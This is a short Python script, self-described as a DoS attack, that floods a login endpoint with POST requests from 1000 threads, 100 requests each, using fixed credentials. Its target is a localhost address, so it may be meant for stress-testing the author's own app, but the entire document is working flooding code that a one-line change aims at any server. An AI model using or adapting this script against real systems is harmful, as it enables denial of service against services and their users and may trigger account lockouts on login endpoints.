# hit an endpoint with a DOS attack

import requests
import threading
import time

# number of threads to spawn
THREADS = 1000

# number of times to hit the endpoint
HITS = 100

# endpoint to hit
ENDPOINT = "http://localhost:3000/auth/login"

# METHOD
METHOD = "POST"

# URL FORM ENCODED DATA
DATA = {'email': 2, 'password': '123123123Aa'}


def hit_endpoint():
    for i in range(HITS):
        try:
            requests.request(METHOD, ENDPOINT, data=DATA)
        except Exception as e:
            print("{} failed in thread {}".format(
                i, threading.current_thread().name))


def main():
    for i in range(THREADS):
        t = threading.Thread(target=hit_endpoint)
        t.start()

    for t in threading.enumerate():
        if t != threading.current_thread():
            t.join()

    print("Done!")


if __name__ == "__main__":
    main()
